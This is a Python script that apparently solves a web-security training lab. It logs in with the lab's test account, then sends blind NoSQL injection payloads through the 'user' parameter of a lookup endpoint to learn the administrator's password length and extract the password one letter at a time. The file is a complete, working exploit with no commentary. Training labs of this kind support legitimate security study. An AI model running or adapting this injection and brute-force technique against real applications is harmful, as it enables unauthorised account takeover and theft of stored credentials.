import requests
from bs4 import BeautifulSoup

LINK = "https://0aa000900448aabe81d41b3300170011.web-security-academy.net"
LOGIN_LINK = LINK + "/login"
VULN_API_ROUTE = LINK + "/user/lookup"
VULN_API_ROUTES_PARAMETR = "user"
ADMIN_USERNAME = "administrator"

LETTERS = ["a","b","c","d","e","f","g","h","i","j","k","l","m","n","o","p","q","r","s","t","u","v","w","x","y","z"]

S = requests.Session()


def detect_passwd_len():
    for i in range(1,40):
        res = S.get(VULN_API_ROUTE + "?" + VULN_API_ROUTES_PARAMETR + "="  + f"{ADMIN_USERNAME}'+%26%26+this.password.length < {i}+||+'a'=='b")
        req_message = res.text 
        
        if "Could" not in req_message:
            return  i - 1 
            

def find_passwd(l):
    passwd = ""
    for i in range(0,l):
        for L in LETTERS:
            REQ_URL = VULN_API_ROUTE + "?" + VULN_API_ROUTES_PARAMETR + "="  + f"{ADMIN_USERNAME}'+%26%26+this.password[{i}]=='{L}"
            res = S.get(REQ_URL)
            req_message = res.text 
            if "Could" not in req_message:
                print("-[!]- --- ", i,"->",L)
                passwd += L
                break
        print("----------------------")

    return passwd


def main():
    
    print("-[]- Start ")
    res = S.get(LOGIN_LINK)
    csrf_token = BeautifulSoup(res.text,'html.parser').find("input", {"name": "csrf"})['value']
    LOGIN_DATA = {
	    "csrf":csrf_token,
		"username":"wiener",
		"password":"peter"
	}
    res = S.post(LOGIN_LINK,data=LOGIN_DATA)
    
    passwd_len = detect_passwd_len()
    
    print("Passwd Len is " , passwd_len)
    
    passwd = find_passwd(passwd_len)
    print("Password is ", passwd)
    

if __name__ == "__main__":
    main()







